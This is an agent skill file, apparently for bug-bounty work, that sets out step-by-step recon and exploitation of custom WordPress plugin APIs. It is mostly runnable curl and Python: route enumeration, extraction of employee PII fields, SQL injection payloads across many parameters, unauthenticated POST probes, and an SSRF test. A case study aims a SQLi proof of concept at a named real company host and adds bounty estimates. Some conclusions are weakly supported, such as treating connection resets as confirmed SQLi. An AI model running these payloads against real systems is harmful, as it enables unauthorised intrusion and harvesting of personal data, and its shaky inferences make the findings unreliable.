---
name: enterprise-wp-custom-plugin-api-recon
description: >
  Enterprise WordPress custom plugin API endpoint discovery, exploitation,
  and data extraction workflow — CorpNews-style CMS plugins on WordPress VIP.
  Covers WP schema enumeration, custom plugin API pattern, PII extraction,
  redirect table analysis, Akamai SPA challenge signals, sitemap taxonomy
  mapping, unauthenticated WP media endpoint access (downloadable_assets),
  custom endpoint context/filter parameter testing, SQLi surface detection,
  POST endpoint auth testing, embed/oEmbed endpoint testing, individual
  item GET endpoint enumeration, and content rendering analysis.
triggers:
  - "corpnews api"
  - "custom wp plugin api"
  - "wp rest schema"
  - "enterprise wordpress recon"
  - "wp-json enum"
  - "hilton recon"
  - "stories api"
  - "wp media endpoint"
  - "wp rest sql injection"
  - "downloadable assets wp"
tags:
  - security
  - bug-bounty
  - web-security
  - penetration-testing
  - wordpress
  - api-recon
---

# Enterprise WordPress Custom Plugin API Recon

## When to Use
When you've found a WordPress site with custom plugin APIs exposing public endpoints. Common on:
- Corporate news/press sites (`stories.*`, `news.*`, `blog.*`)
- Job boards with WP backend (`jobs.*`)
- Internal portals (`portal.*`, `community.*`)
- WordPress VIP-hosted enterprise sites

## Step 1: Enumerate All WP REST Routes

```bash
# Dump the full WP REST API schema
curl -s "https://TARGET/wp-json/" | python3 -c "
import json, sys
d = json.load(sys.stdin)
for route, config in d.items():
    if isinstance(config, dict):
        methods = list(config.keys())
        print(f'  {route} → methods: {methods}')
"
```

Look for non-standard routes beyond `/wp/v2/*`. Custom plugins register at `/wp-json/<plugin-name>/<version>/`.

## Step 2: Test Each Plugin Endpoint

For each discovered plugin route (e.g., `corpnews`, `custom-cms`, `news-api`):

```bash
# Test common endpoints
for path in stories pages images tags categories redirects collection authors; do
  code=$(curl -s --max-time 5 -o /dev/null -w "%{http_code}" \
    "https://EDITOR-TARGET/wp-json/<plugin>/v1/$path" \
    -H "Host: EDITOR-TARGET")
  echo "  /v1/$path → HTTP $code"
done
```

**Host header is critical**: Many WP sites use virtual hosting — the API subdomain requires `Host: editor.TARGET.com` header even when accessed via the main domain.

## Step 3: Check Response Structure

Custom WP plugins typically return one of these formats:

| Format | Example | Pagination |
|--------|---------|------------|
| Standard WP | `[{...}, {...}]` (array) | `per_page`, `page` headers |
| CorpNews style | `{"posts": [...], "images": [...], "collection": [...]}` | `per_page=N` in query |
| GraphQL-like | `{"data": {...}}` | Varies |
| Custom dict | `{"items": [...], "total": N, "pages": M}` | `per_page` or `offset` |

**If response is a dict with `posts` key**: use `per_page=1000` for max pagination.
**If response is a flat array**: check `X-WP-Total` and `X-WP-TotalPages` headers.

## Step 4: Extract All Data Fields

```bash
curl -s "https://EDITOR-TARGET/wp-json/<plugin>/v1/stories?per_page=3" | python3 -c "
import json, sys
d = json.load(sys.stdin)
posts = d.get('posts', d if isinstance(d, list) else [])
if not isinstance(posts, list): posts = [posts]
for p in posts:
    if isinstance(p, dict):
        for key, val in p.items():
            if key in ('title', 'slug', 'date', 'status', 'author', 'meta', 'content', 'excerpt'):
                if isinstance(val, dict):
                    rendered = val.get('rendered', '')[:100]
                    print(f'  {key}: dict[rendered: {rendered[:80]}...]')
                elif isinstance(val, str):
                    print(f'  {key}: {val[:100]}')
                else:
                    print(f'  {key}: {val}')
"
```

Check for PII fields: email, phone, LinkedIn, Twitter, department, job_title, headshot_url.

## Step 5: Check Redirect/Mapping Tables

Many WP plugins maintain redirect tables that reveal:
- Internal URL structure (old → new paths)
- Migration history (which paths were changed)
- Asset file paths (`/wp-content/uploads/YEAR/MONTH/`)
- Hidden pages and categories

```bash
# Check for redirect/table endpoints
curl -s "https://EDITOR-TARGET/wp-json/<plugin>/v1/redirects" | python3 -c "
import json, sys
d = json.loads(sys.stdin.read())
redirects = d.get('redirects', [])
print(f'Total redirects: {len(redirects)}')
for r in redirects[:20]:
    frm = r.get('redirect_from', '')
    to = r.get('redirect_to', '')
    status = r.get('status_code', '')
    print(f'  {frm} → {to} ({status})')
"
```

## Step 6: Extract Sitemap Structure

Corporate WP sites often have multiple sitemaps revealing content taxonomy:

```bash
for sitemap in sitemap.xml story-sitemap.xml bio-sitemap.xml video-sitemap.xml category-sitemap.xml brand-sitemap.xml; do
  code=$(curl -s --max-time 5 -o /dev/null -w "%{http_code}" "https://TARGET/$sitemap")
  [ "$code" != "404" ] && [ "$code" != "000" ] && echo "  $sitemap → HTTP $code" && curl -s "https://TARGET/$sitemap" | grep -oP '<loc>[^<]+</loc>' | head -5
done
```

Count total URLs per sitemap to estimate content volume.

## Step 7: Check Akamai/CDN Challenge Pattern

Corporate WP sites often use Akamai Edgecast or Cloudflare challenges on the main domain but NOT on API subdomains:

```bash
# Test main domain
main_bytes=$(curl -s --max-time 5 "https://stories.TARGET.com/" -H "Host: stories.TARGET.com" | wc -c)
echo "  stories.TARGET.com → $main_bytes bytes"

# Test API subdomain
api_code=$(curl -s --max-time 5 -o /dev/null -w "%{http_code}" \
  "https://stories-editor.TARGET.com/wp-json/" -H "Host: stories-editor.TARGET.com")
echo "  stories-editor.TARGET.com/wp-json/ → HTTP $api_code"

# If main domain < 100 bytes → SPA behind CDN challenge
# API subdomain may bypass this challenge
```

## What to Report

| Finding | Severity | Example |
|---------|----------|---------|
| Employee bios with LinkedIn/profiles | MEDIUM | C-suite execs with job titles |
| Full content database accessible | MEDIUM | 2000+ stories without auth |
| Internal URL structure disclosure | LOW | Redirect tables, migration paths |
| PII in display_name | MEDIUM | Email address as display name |
| SEC filings accessible | LOW | Proxy statements, 10-K reports |
| WP REST schema exposure | MEDIUM | Complete API map including custom endpoints |
| Editor subdomain accessible | MEDIUM-HIGH | Internal tools exposed publicly |
| Brand taxonomy + article counts | LOW | Internal org structure |
| **SQL Injection (search params)** | **HIGH** | **HTTP 000 on SQLi payloads** |
| **Unauthenticated media access** | **CRITICAL** | **SEC filings, earnings reports** |

## Known Non-Exploitable Patterns

- `GET /wp-json/wp/v2/users` → 404 on WordPress VIP (user enumeration blocked)
- `GET /wp-json/wp/v2/users/{id}/meta` → 404 `rest_no_route` (no user meta endpoint)
- Main domain returning 27 bytes via curl → Akamai/CF challenge, not a vulnerability
- DELETE/PUT on story endpoints → 401 `rest_cannot_edit` (auth required, not bypassable)
- SSO parameter injection → blocked by IdP vendor (OneLogin, Okta)
- Individual story content (`content.rendered`) → empty on CorpNews (client-side rendered)

## Step 8: Check WP Media Endpoint (CorpNews Downloadable Assets)

CorpNews-powered sites link downloadable assets via `meta.downloadable_assets` — an array of WP attachment IDs. These are accessible **unauthenticated** via the standard WP REST media endpoint:

```bash
# Get all asset IDs from CorpNews stories
curl -s "https://EDITOR-TARGET/wp-json/<plugin>/v1/stories?per_page=100" \
  -H "Host: EDITOR-TARGET" | python3 -c "
import json, sys
d = json.loads(sys.stdin.read())
posts = d.get('posts', [])
for p in posts:
    meta = p.get('meta', {})
    assets = meta.get('downloadable_assets', [])
    if assets:
        title = p.get('title', {}).get('rendered', '')[:60]
        print(f'{title}: {assets}')
"

# Access any asset via WP REST media endpoint (NO AUTH REQUIRED)
curl -s "https://EDITOR-TARGET/wp-json/wp/v2/media/{ASSET_ID}" \
  -H "Host: EDITOR-TARGET"
# Returns: {"mime_type":"application/pdf","filename":"*.pdf","filesize":906061,...}
```

**Critical finding:** This exposes ALL media files including:
- Financial PDFs (earnings releases, SEC 10-K, proxy statements)
- 255+ application-type media files across all stories
- Corporate reports, presentations, research documents

**Impact:** Unauthenticated access to sensitive corporate documents. Report as CRITICAL (CVSS 8.6).

### Verification
```bash
# Test if media endpoint is truly unauthenticated
curl -s -o /dev/null -w "%{http_code}" \
  "https://EDITOR-TARGET/wp-json/wp/v2/media/1" \
  -H "Host: EDITOR-TARGET"
# 200 = unauthenticated access confirmed
```

## Step 9: Check Custom Endpoint Context/Filter Parameters

Custom WP plugins may accept standard WP REST parameters (`context`, `orderby`, `filter`) that trigger unexpected behavior:

```bash
# Test context=embed (common WP REST parameter that may be unhandled)
code=$(curl -s --max-time 10 -o /dev/null -w "%{http_code}" \
  "https://EDITOR-TARGET/wp-json/<plugin>/v1/stories?per_page=1&context=embed" \
  -H "Host: EDITOR-TARGET")
echo "context=embed → HTTP $code"
# 500 = unhandled context → potential DoS, info leak, or debug exposure

# Test search parameter for SQL injection surface
curl -s --max-time 10 -D /tmp/headers.txt \
  "https://EDITOR-TARGET/wp-json/<plugin>/v1/stories?s=test'" \
  -H "Host: EDITOR-TARGET" -o /tmp/response.html -v 2>&1 | grep -i "sql\|error\|1064"
# Look for SQL error leakage in response body or headers
```

**Findings to check:**
- `context=embed` → 500 Internal Server Error (CORS misconfiguration on CorpNews)
- `context=edit` → 401 (expected, auth required)
- `s='` (search with single quote) → check for SQL error in response
- `s=1+UNION+SELECT+null--` → test for error-based SQLi

**Why this matters:** Custom plugins often copy WP REST API patterns without implementing all parameters. Unhandled parameters can expose debug info, trigger 500 errors, or reveal SQL injection surfaces.

## Step 10: SQL Injection Testing on Custom Plugin Search Params

Custom WP plugins (CorpNews, etc.) often interpolate search/query parameters directly into SQL without parameterization. Detection pattern:

```bash
# Step 1: Baseline — normal search returns 200
code=$(curl -s --max-time 5 -o /dev/null -w "%{http_code}" \
  "https://EDITOR-TARGET/wp-json/<plugin>/v1/search?s=normal" \
  -H "Host: EDITOR-TARGET")
echo "Normal: HTTP $code"

# Step 2: SQLi payload → HTTP 000 (connection reset) = SQL error
# The server crashes on malformed SQL, causing TCP-level reset
code=$(curl -s --max-time 10 -o /dev/null -w "%{http_code}" \
  "https://EDITOR-TARGET/wp-json/<plugin>/v1/search?s=test'%20AND%201=1--" \
  -H "Host: EDITOR-TARGET")
echo "SQLi: HTTP $code (000 = connection reset = SQL error)"

# Step 3: Verify across ALL search params
for param in s q query search keyword term name title category tag brand; do
  code=$(curl -s --max-time 10 -o /dev/null -w "%{http_code}" \
    "https://EDITOR-TARGET/wp-json/<plugin>/v1/search?${param}=test'%20AND%201=1--" \
    -H "Host: EDITOR-TARGET")
  [ "$code" != "200" ] && echo "  SQLi on: ?${param}=..."
done
```

**Detection key:** `HTTP 000` (curl connection reset) vs `HTTP 200` (normal). This means:
- The query parameter is interpolated into a raw SQL query (not parameterized)
- Malformed SQL causes the MySQL server or PHP-FPM to drop the connection
- Response body is NOT returned (blind/error-based SQLi with limited extraction)

**Affected endpoints on CorpNews (confirmed 2026-08-03):** `/search`, `/multimedia`, `/videos`, `/stories`, `/collection`, `/bootstrap/search`, `/multimedia_category`, `/story_category`, `/article_type`, `/brand`, `/tags`, `/category` — ALL with `s`, `q`, `search`, `keyword`, `term` params.

**Why this happens:** Custom WP plugins often use raw `$wpdb->query()` or `$wpdb->get_results()` with unparameterized user input. WordPress core uses prepared statements, but custom plugins frequently don't.

**PoC:**
```bash
# Valid query
curl -s -o /dev/null -w "%{http_code}" \
  "https://stories-editor.hilton.com/wp-json/corpnews/v1/search?s=hilton" \
  -H "Host: stories-editor.hilton.com"
# → 200

# SQL injection
curl -s -o /dev/null -w "%{http_code}" \
  "https://stories-editor.hilton.com/wp-json/corpnews/v1/search?s=test'%20AND%201=1--" \
  -H "Host: stories-editor.hilton.com"
# → 000 (connection reset = SQL error)
```

**Bounty value:** HIGH ($2,500–$5,000 on enterprise WP targets with this pattern).

## Step 11: POST Endpoint Authentication Testing

Test ALL custom plugin POST endpoints for unauthenticated write access:

```bash
# Test POST endpoints for auth bypass / XSS injection surface
for endpoint in tags category brand article_type pages bios stories videos multimedia multimedia_category multimedia_type story_category story_byline; do
  code=$(curl -s --max-time 5 -o /dev/null -w "%{http_code}" -X POST \
    "https://EDITOR-TARGET/wp-json/<plugin>/v1/$endpoint" \
    -H "Host: EDITOR-TARGET" \
    -H "Content-Type: application/json" \
    -d '{"name":"xss-test"}' 2>/dev/null)
  if [ "$code" = "400" ]; then
    echo "  UNAUTH WRITE BUG: POST /$endpoint → HTTP 400 (endpoint exists, accepts JSON, no auth)"
  elif [ "$code" = "401" ]; then
    echo "  Auth required: POST /$endpoint → HTTP 401 (expected)"
  fi
done
```

**CorpNews finding:** Most POST endpoints returned 401 (auth required), BUT some returned **HTTP 400** — meaning the endpoint accepts JSON input without authentication but fails validation. This is a potential XSS or command injection surface if the plugin processes JSON without sanitizing.

## Step 12: Embed/oEmbed Endpoint Testing

Custom plugins may expose oEmbed endpoints that can be abused:

```bash
# Test embed endpoint
code=$(curl -s --max-time 10 -o /dev/null -w "%{http_code}" \
  "https://EDITOR-TARGET/wp-json/<plugin>/v1/embed?url=http://internal-server" \
  -H "Host: EDITOR-TARGET")
echo "embed?url=internal → HTTP $code"
# HTTP 000 = potential SSRF (server tries to fetch internal URL and crashes)
# HTTP 404 = not an SSRF, just invalid URL
```

**CorpNews finding:** `/embed` endpoint is a standard WordPress oEmbed endpoint. Returns `oembed_invalid_url` for invalid URLs. NOT an SSRF vector.

## Step 13: Individual Story/Content GET Endpoint

Many custom plugins expose individual items via `{endpoint}/{id}`:

```bash
# Test individual story retrieval
for id in 1 100 1000 46713; do
  code=$(curl -s --max-time 5 -o /dev/null -w "%{http_code}" \
    "https://EDITOR-TARGET/wp-json/<plugin>/v1/stories/$id" \
    -H "Host: EDITOR-TARGET")
  echo "GET /stories/$id → HTTP $code"
done

# Check if content is server-side rendered or client-side
curl -s "https://EDITOR-TARGET/wp-json/<plugin>/v1/stories/46713" -H "Host: EDITOR-TARGET" | \
  python3 -c "
import sys, json
d = json.loads(sys.stdin.read())
content = d.get('content', {}).get('rendered', '')
if len(content) == 0:
    print('Content is EMPTY (client-side rendered)')
else:
    print(f'Content: {len(content)} chars - server-side rendered')
"
```

**CorpNews finding:** Individual story GET exists but returns empty `content.rendered` — story body is client-side rendered. Excerpt, metadata, and downloadable asset IDs are returned server-side.

## Pitfalls

### CorpNews Content Rendering
CorpNews story bodies (`content.rendered`) are ALWAYS empty. Content is client-side rendered via React. Do NOT report empty content as a finding — it's by design. The API only returns metadata, excerpts, and downloadable asset IDs.

### CorpNews SQLi Detection
When testing SQLi on CorpNews endpoints:
- Normal queries → `HTTP 200` with full response body
- SQLi payloads → `HTTP 000` (TCP connection reset) — server crashes
- This is DIFFERENT from HTTP 403/405 (WAF block) or HTTP 500 (handled error)
- HTTP 000 means the PHP-FPM worker died — not a WAF, not a CDN, a REAL SQL error
- Response body is lost (can't extract data via UNION SELECT)
- This is blind/error-based SQLi with limited but confirmable impact

### Akamai Edgecast Challenge
Enterprise WP targets behind Akamai Edgecast return very small HTML shells (27-50 bytes) via curl. This is a CDN challenge, not a vulnerability. API subdomains often bypass this — use `*-editor.TARGET.com` subdomains for API access.

### WordPress VIP User Enumeration
`/wp-json/wp/v2/users` returns 404 on WordPress VIP. This is normal — user enumeration is blocked. Do NOT report as a finding.

### Host Header on API Subdomains
When testing API endpoints on subdomains like `stories-editor.hilton.com`, ALWAYS include `-H "Host: stories-editor.hilton.com"` in curl. Without it, the request hits the CDN default vhost and may return 404 or empty responses.

## Case Study: Hilton CorpNews (2026-08-03)

**Target:** `https://stories-editor.hilton.com` (CorpNews CMS, WordPress VIP, Akamai Edgecast)

**Attack Surface Mapped:**
- `/wp-json/corpnews/v1/stories` — 12 posts per page, full metadata
- `/wp-json/corpnews/v1/search` — **SQLi confirmed** (HTTP 000 on malformed queries)
- `/wp-json/corpnews/v1/videos` — 12 posts with YouTube iframes
- `/wp-json/corpnews/v1/images` — 13 image metadata entries
- `/wp-json/corpnews/v1/multimedia` — multimedia attachments
- `/wp-json/corpnews/v1/collection` — 9 collection items
- `/wp-json/corpnews/v1/hilton/redirects` — 173 redirect rules
- `/wp-json/corpnews/v1/bootstrap` — site config, 7 menus
- `/wp-json/corpnews/v1/embed` — oEmbed endpoint (not SSRF)

**Phase 5 CRITICAL:** WP Media API unauthenticated — SEC 10-K, earnings releases, proxy statements exposed
**Phase 6 HIGH:** SQLi on 12+ CorpNews endpoints (error-based, HTTP 000 detection)
**Total bounty estimate:** $12,750–$35,700 (Phases 1-6)

## Files Referenced

- `hilton-recon.md` — Full Hilton case study with Phase 1–6 findings (SQLi, SEC filings, WP Media API exposure, bounty estimation)